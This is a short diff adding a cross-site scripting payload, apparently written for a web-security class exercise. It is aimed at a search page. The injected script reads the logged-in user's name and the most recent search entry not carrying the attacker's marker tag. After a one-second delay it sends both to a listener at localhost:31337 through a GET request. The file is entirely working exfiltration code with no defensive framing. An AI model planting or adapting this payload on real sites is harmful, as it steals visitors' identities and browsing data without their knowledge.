@@ -1,0 +1,17 @@
+my_tag	<!-- created a tag to check if search was made by the user or by me-->
+<script>
+	var username = document.getElementById('logged-in-user').innerHTML;	// Login
+	var last_search = "DEFAULT";	// base parameter for last search
+
+	setTimeout(function() {
+		var history = document.getElementById('history-list').getElementsByClassName('history-item');
+		for (let i=0; i < history.length; i++) {	// iterate through all history
+			if (history[i].innerHTML.includes('my_tag') == false) {	// if statement that finds the result without my tag
+				last_search=history[i].innerHTML;
+				break;
+			}
+		}
+
+		$.get("http://localhost:31337/?stolen_user="+username+"&last_search="+last_search)	// get request
+	}, 1000);	
+</script>
